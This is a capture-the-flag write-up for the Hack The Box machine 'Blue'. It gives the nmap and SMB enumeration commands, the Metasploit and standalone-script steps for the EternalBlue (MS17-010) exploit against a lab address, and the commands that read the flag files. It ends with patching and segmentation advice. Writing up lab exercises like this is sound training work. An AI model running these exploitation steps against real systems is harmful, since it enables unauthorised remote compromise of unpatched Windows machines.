---
title: "HTB - Blue"
difficulty: "Easy"
tags: ["windows", "eternal-blue", "privilege-escalation", "smb"]
platform: "Hack The Box"
date: "2024-01-15"
author: "Your Name"
---

# HTB - Blue Writeup

## Overview

Blue is an easy Windows machine that focuses on the EternalBlue vulnerability (CVE-2017-0144). This writeup covers the complete methodology from initial reconnaissance to root access.

## Reconnaissance

### Initial Nmap Scan

```bash
nmap -sC -sV -oA nmap/blue 10.10.10.40
```

**Results:**
- Port 135: MSRPC
- Port 139: NetBIOS
- Port 445: SMB (Microsoft Windows 7 - 10 / Server 2008 - 2016)
- Port 49152-49157: Windows RPC

### SMB Enumeration

```bash
smbclient -L //10.10.10.40 -N
```

The machine appears to be vulnerable to EternalBlue based on the Windows version and open SMB port.

## Exploitation

### Using Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
exploit
```

### Manual Exploitation

Alternatively, we can use the standalone exploit:

```bash
python2.7 42315.py 10.10.10.40
```

## Post-Exploitation

### Getting System Shell

After successful exploitation, we have a shell as `NT AUTHORITY\SYSTEM`.

### Finding Flags

```powershell
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\haris\Desktop\user.txt
```

## Key Takeaways

1. **EternalBlue** is a critical vulnerability affecting older Windows systems
2. Always keep systems patched and up-to-date
3. SMB should be restricted or disabled if not needed
4. Network segmentation can limit the impact of such vulnerabilities

## References

- [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

